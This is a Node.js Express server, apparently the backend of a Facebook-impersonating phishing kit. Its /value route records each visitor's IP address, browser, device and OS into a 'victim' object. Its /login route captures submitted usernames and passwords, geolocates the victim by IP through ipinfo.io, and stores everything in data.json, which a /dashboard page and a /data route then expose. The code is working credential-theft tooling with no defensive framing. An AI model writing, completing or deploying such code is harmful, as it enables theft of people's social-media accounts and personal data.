// Import
const express = require('express');
const { DateTime } = require('luxon')
const axios = require('axios');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const device = require('express-device');
const bodyParser = require('body-parser');
const compression = require('compression');;

const app = express();
app.use(device.capture());
app.use(express.static(path.join(__dirname, 'static')));
const desktop = path.join(__dirname, 'static', 'desktop.html');
const mobile = path.join(__dirname, 'static', 'mobile.html');
const help = path.join(__dirname, 'static', 'help.html');
const admin = path.join(__dirname, 'static', 'admin.html');
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(compression({
  level: 7,
  threshold: 10 * 1000,
}))
app.use(cors());
////data/data.json
let data = { victim: [] }; // بيانات افتراضية
const dataFilePath = 'static/data/data.json';
const visitorFilePath = 'static/data/visitore.json';
if (fs.existsSync(dataFilePath)) {
  // إذا وجد الملف JSON، قم بقراءة البيانات منه
  const jsonData = fs.readFileSync(dataFilePath, 'utf-8');
  data = JSON.parse(jsonData);
} else {
  // إذا لم يجد الملف JSON، قم بإنشاء ملف JSON جديد
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2), 'utf-8');
}
// this is respinse for getname device and model verfication type device for user 
app.get('/', (req, res) => {
  const name = req.device.name; // Get the device name
  const model = req.device.model
  const deviceType = req.device.type;

  if (deviceType === "desktop") {
    res.sendFile(desktop)
    console.log("this desktop")
    console.log("name phone:" + name)
    console.log("model phone:" + model)

  } else if (deviceType === 'phone' || deviceType === 'tablet') {
    res.sendFile(mobile)
    console.log("this mobile")
  } else {
    res.send("this machine not sportted")
  }
});
// this part for share values app.post('/send-value') and app.use('/send-value')


let victim
/// response Ip and informetion user
app.use('/value', (req, res, next) => {
  const { value } = req.body;
  const { ipa } = req.body;
  const { br } = req.body;
  const { df } = req.body;
  const { nd } = req.body;
  const { mnf } = req.body;
  const { of } = req.body;
  const { no } = req.body;
  const { vos } = req.body;

  victim = {
    Spam: "Facebook",
    SYSTEM: value,
    Ip: ipa,
    Browser: br,
    FDevice: df,
    Device: nd,
    MfactoryD: mnf,
    OSFamilly: of,
    OS: no,
    VersionOS: vos
  };
  next();
});
app.post('/value', (req, res) => {

});
/// get value email && password 
app.post('/login', async (req, res) => {
  ///value logiciel victim
  let info = victim
  console.log(`---------------------------------------------`);
  // get user and pass for html  == form post
  const date = DateTime.now().toFormat('yyyy-MM-dd');
  const time = DateTime.now().toFormat('H:mm:ss:SSS');
  const user = req.body.username;
  const pass = req.body.pass;
  // this responsable in time and date victim send he information
  info.clock = date
  info.time = time
  info.username = user
  info.password = pass
  //  console.log('informition 1:\n',info)
  console.log("user :" + user)
  console.log("password :" + pass)
  //  console.log(info.Ip)
  //console.log(info)

  res.sendFile(help)
  //test 

  const ip = info.Ip;

  //req.clientIp;
  let mergedObject = null
  //  console.log(mergedObject)  
  ///  console.log('informition 2:\n',info)
  // her responsable for save informetion  get from user or victim
  try {
    let recieve = await getLocationByIp(ip);
    mergedObject = { ...info, ...recieve };

    console.log(mergedObject);
    //console.log(recieve)
    data = JSON.parse(fs.readFileSync(dataFilePath));
  } catch (err) {
    // File does not exist or is not valid JSON
  }
  // Add the new victim to the array
  data.victim.push(mergedObject);
  //Write the updated object back to data.json
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
});
async function getLocationByIp(ip) {
  const response = await axios.get(`https://ipinfo.io/${ip}/json`);
  //  console.log(response.data)
  return response.data;
}
// this page admin 
app.get('/dashboard', (req, res) => {
  res.sendFile(admin)
})

////conter vistore
app.use((req, res, next) => {
  const visitorData = getVisitorData();
  visitorData.count += 1;
  saveVisitorData(visitorData);
  next();
});

// Route to get the current visitor count
app.get('/getCount', (req, res) => {
  const visitorData = getVisitorData();
  res.json({ count: visitorData.count });
});

// Helper function to read visitor data from file
function getVisitorData() {
  try {
    const data = fs.readFileSync(visitorFilePath, 'utf-8');
    return JSON.parse(data);
  } catch (error) {
    // If the file doesn't exist or there's an error, return a default object
    return { count: 0 };
  }
}
// Helper function to save visitor data to file
function saveVisitorData(visitorData) {
  const data = JSON.stringify(visitorData, null, 2);
  fs.writeFileSync(visitorFilePath, data);
}
// router send data.json from backend to frentend
app.get("/data", (req, res) => {
  fs.readFile(dataFilePath, 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Error reading data.json');
    }

    res.json(JSON.parse(data));
  });
})
//remove null in data.json


function removeNullEntries() {
  // Read the JSON file
  const rawData = fs.readFileSync(dataFilePath);
  const data = JSON.parse(rawData);

  // Remove null entries from the "victim" array using a for loop
  if (data && data.victim && Array.isArray(data.victim)) {
    const newArray = [];
    for (let i = 0; i < data.victim.length; i++) {
      const item = data.victim[i];
      if (item !== null) {
        newArray.push(item);
      }
    }
    data.victim = newArray;
  }

  // Write the modified data back to the file
  const modifiedData = JSON.stringify(data, null, 2);
  fs.writeFileSync(dataFilePath, modifiedData);

  console.log('JSON file updated successfully.');
}

// Run the function at regular intervals (every 5 seconds in this example)
setInterval(removeNullEntries, 10000);

console.log('The process is running. Press Ctrl+C to stop.');

////////////////////////////////////////////////////////////////////////////
const port = process.env.PORT || 4000;;
app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
});
































